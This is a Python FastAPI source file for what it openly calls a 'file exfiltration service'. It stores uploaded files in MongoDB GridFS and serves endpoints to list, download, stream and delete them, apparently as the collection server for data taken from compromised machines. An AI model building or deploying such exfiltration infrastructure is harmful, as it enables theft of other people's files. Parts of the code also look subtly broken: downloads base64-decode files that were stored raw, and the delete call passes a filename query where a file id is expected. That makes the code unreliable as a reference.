from fastapi import FastAPI, File, UploadFile, Request
from fastapi.responses import HTMLResponse, StreamingResponse
from gridfs import GridFS
from pymongo import MongoClient
from bson import ObjectId
import datetime
import base64

app = FastAPI()

# Initialize the MongoDB client
client = MongoClient("mongodb://mongo:27017/")
db = client["mydatabase"]
connections = db["connections"]
fs = GridFS(db)

# API endpoints to interact with the file exfiltration service
# upload a file to the server
@app.post('/file-exfil/upload')
async def upload_file(file: UploadFile = File(...)):
    if not file:
        return {'error': 'No file part'}

    if file.filename == '':
        return {'error': 'No selected file'}

    # Save the file to MongoDB GridFS with name, size, and date
    file_id = fs.put(
        file.file.read(), 
        filename=file.filename, 
        content_type='application/octet-stream', 
        uploadDate=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        extension=file.filename.split('.')[-1] if '.' in file.filename else None
    )

    return {'message': 'File uploaded successfully', 'filename': file.filename, 'file_id': str(file_id)}

# list files on the server
@app.get('/file-exfil/list-files')
async def list_files():
    file_list = []

    # Query MongoDB's GridFS for a list of files
    for grid_file in fs.find():
        file_info = {
            '_id': str(grid_file._id), # convert ObjectId to string
            'filename': grid_file.filename,
            'length': grid_file.length,
            'uploadDate': grid_file.upload_date
        }
        file_list.append(file_info)

    return {'file_list': file_list}

# download a file from the server
@app.get('/file-exfil/download/{fileID}')
async def download_file(fileID: str):
     # Retrieve the file content from MongoDB GridFS
    grid_file = fs.find_one({"_id": ObjectId(fileID)})
    if not grid_file:
        return HTMLResponse(content="File not found", status_code=404)

    # extract file name and extension
    filename = grid_file.filename
    file_extension = filename.split('.')[-1] if '.' in filename else ''

    # Convert base64 string to bytes and yield
    def decode_base64(file_data):
        for chunk in file_data:
            yield base64.b64decode(chunk)

    # Create a streaming response with the decoded file
    return StreamingResponse(decode_base64(grid_file), media_type='application/octet-stream', headers={"Content-Disposition": f"attachment; filename={filename}"}, status_code=200)

# delete a file from the server
@app.delete('/file-exfil/delete/{filename}')
async def delete_file(filename: str):
    # Delete the file from MongoDB GridFS
    fs.delete({"filename": filename})

    return {'message': 'File deleted successfully', 'filename': filename}

# stream the file content to the client
@app.get('/file-exfil/content/{filename}')
async def file_content(request: Request, filename: str):
    # Retrieve the file content from MongoDB GridFS
    grid_file = fs.find_one({"filename": filename})
    if not grid_file:
        return HTMLResponse(content="File not found", status_code=404)

    # Return the file data as a response
    return StreamingResponse(grid_file, media_type='application/octet-stream')
